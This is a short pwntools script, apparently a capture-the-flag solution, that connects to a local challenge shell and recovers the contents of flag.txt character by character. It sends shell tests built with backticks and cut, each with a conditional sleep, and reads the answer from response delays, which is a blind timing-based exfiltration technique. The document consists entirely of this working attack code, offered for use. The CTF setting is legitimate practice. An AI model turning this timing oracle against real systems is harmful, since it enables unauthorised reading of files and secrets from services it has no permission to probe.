#!/usr/bin/python3
from string import ascii_letters, digits
from pwn import *

HOST, PORT = "localhost", 6002
CHARSET = "_}" + ascii_letters + digits
# Increase these if latency to the challenge is high
TIMEOUT = 0.05
SLEEP = 0.1


flag = "shellmates{"
r = remote(HOST, PORT)
r.recvuntil("$ ")

while "}" not in flag:
    for char in CHARSET:
        r.sendline(
            f"[ `cut -c{len(flag) + 1} flag.txt` = {char} ] && sleep {SLEEP}"
        )
        if not r.recvuntil("$ ", timeout=TIMEOUT):
            r.recvuntil("$ ")
            flag += char
            r.success(f"{flag}")
            break
